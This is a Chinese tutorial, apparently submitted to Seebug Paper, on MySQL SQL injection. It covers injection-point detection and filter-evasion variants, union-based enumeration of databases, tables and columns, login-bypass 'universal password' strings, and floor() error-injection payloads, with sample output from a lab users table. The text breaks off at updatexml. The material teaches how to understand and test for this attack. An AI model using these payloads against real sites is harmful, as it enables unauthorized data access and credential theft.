**作者： 啵啵  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
**注入攻击的本质，是把用户输入的数据当做代码执行。**
  * 这里有两个关键条件：
**第一个是用户能够控制输入**
**第二个是原本程序要执行的代码，拼接了用户输入的数据然后进行执行**
## 判断注入点
最古老的方法
  * and 1=1 页面正常
  * and 1=2 页面不正常
最简单的方法
  * 页面后加 '，看是否报错
  * 如果是数字型传参，可以尝试-1
例如：
  * http://www.xxx.com/new.php?id=1 页面显示id=1的新闻
  * http://www.xxx.com/new.php?id=2-1 页面显示id=1的新闻
**and 1=1 and 1=2 被拦截的可能性太高了，可以尝试 and -1=-1 and -1=-2 and 1 >0 or 1=1。**
**或者直接 or sleep(5)**
## 常用函数
查看当前数据库版本
  * VERSION()
  * @@VERSION
  * @@GLOBAL.VERSION
查看数据库当前登陆用户
  * USER()
  * CURRENT_USER()
  * SYSTEM_USER()
  * SESSION_USER()
当前使用的数据库
  * DATABASE()
  * SCHEMA()
系统相关
  * @@BASEDIR : mysql安装路径：
  * @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
  * @@DATADIR : 数据存储路径：
  * @@CHARACTER_SETS_DIR : 字符集设置文件路径
  * @@LOG_ERROR : 错误日志文件路径：
  * @@PID_FILE : pid-file文件路径
  * @@BASEDIR : mysql安装路径：
  * @@SLAVE_LOAD_TMPDIR : 临时文件夹路径：
  * @@version_compile_os:操作系统版本:
注释
  * \-- qwe(有一个空格)
  * # 
## 联合数据
    concat()
    group_concat()
    concat_ws()
### CIBCAT
基本格式
    CONCAT(str1,str2)
返回结果为连接参数产生的字符串。如有任何一个参数为 NULL ，则返回值为 NULL。可以有一个或多个参数。
**参数中有 NULL**
    mysql> SELECT CONCAT(id,',',NULL,',',password) AS users FROM users LIMIT 1,1;
    +-------+
    | users |
    +-------+
    | NULL  |
    +-------+
    1 row in set (0.00 sec)
**使用 LIMIT 来控制结果数量**
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 1;  
    +-------------+                                                                  
    | users       |                                                                  
    +-------------+                                                                  
    | 1,Dumb,Dumb |                                                                  
    +-------------+                                                                  
    1 row in set (0.00 sec)         
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 2;  
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 1,Dumb,Dumb           |                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+     
    2 rows in set (0.00 sec)
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 0,1;
    +-------------+                                                                  
    | users       |                                                                  
    +-------------+                                                                  
    | 1,Dumb,Dumb |                                                                  
    +-------------+                                                                  
    1 row in set (0.00 sec)           
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 0,2;
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 1,Dumb,Dumb           |                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+                                                        
    2 rows in set (0.00 sec)     
    mysql> SELECT CONCAT(id,',',username,',',password) AS users FROM users LIMIT 1,1;
    +-----------------------+                                                        
    | users                 |                                                        
    +-----------------------+                                                        
    | 2,Angelina,I-kill-you |                                                        
    +-----------------------+                                                        
    1 row in set (0.00 sec)         
### CONCAT_WS
`CONCAT_WS()` 代表 `CONCAT With Separator`
，是`CONCAT()`的特殊形式。第一个参数是其它参数的分隔符。这样参数多的话就不用手动的去添加分隔符了。
基本格式
    CONCAT_WS(separator,str1,str2,…)
Separator 为字符之间的分隔符
    mysql> SELECT CONCAT_WS('~',id,username,password) AS users FROM users LIMIT 0,2;
    +-----------------------+                                                       
    | users                 |                                                       
    +-----------------------+                                                       
    | 1~Dumb~Dumb           |                                                       
    | 2~Angelina~I-kill-you |                                                       
    +-----------------------+                                                       
    2 rows in set (0.00 sec)                                                        
### GROUP_CONCAT
基本格式
    GROUP_CONCAT(str1,str2,…)
    mysql> SELECT GROUP_CONCAT(id,username,password) AS users FROM users; 
    +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    | users | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    | 1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4 
    | +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
    1 row in set (0.00 sec)
# 显错注入
Mysql在5.0以上版本加入了 information_schema 这个系统自带库
其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等
  * **information_schema.tables 存放表名和库名的对应**
  * **information_schema.columns 存放字段名和表名的对应**
注: **information_schema.tables 实际上是选中information_schema库中的tables表**
## 基本流程
### 判断字段数目
    ORDER BY 10 
    ORDER BY 5  
    ORDER BY 2  
    ....
### 判断显示位
    union select 1,2,3,4,5,6,7……
### 查看当前数据库
    union select 1,2,database()
### 查表名
    union select 1,2,table_name from information_schema.tables where 
    table_schema=database() 
### 查列名
    union select 1,2,column_name from information_schema.columns where 
    table_name='表名' and table_schema=database() 
### 查询字段值
    union select 1,字段名,字段名 from 表名
# POST注入
POST注入就是使用POST进行传参的注入，本质上和GET类型的没什么区别
POST注入高危点
  * 登录框
  * 查询框
  * 等各种和数据库有交互的框
## 万能密码
    'or 1=1-- qwe
    'or 1=1#
    admin'-- qwe
    admin'#
# 报错注入
## floor()报错
### 原理
floor()报错注入的原因是group
by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。
### 报错语句
    mysql> select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2));
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'
    mysql> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'
    mysql> select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a;
    ERROR 1062 (23000): Duplicate entry '5.5.54-log1' for key 'group_key'
### 关键表被禁用了
    select count(*) from (select 1 union select null union select !1)x group by concat(database(),floor(rand(0)*2)) 
## xpath语法报错
**updatexml()** 更新xml文档的函数
语法：updatexml(目标xml内容，xml文档路径，更新的内容)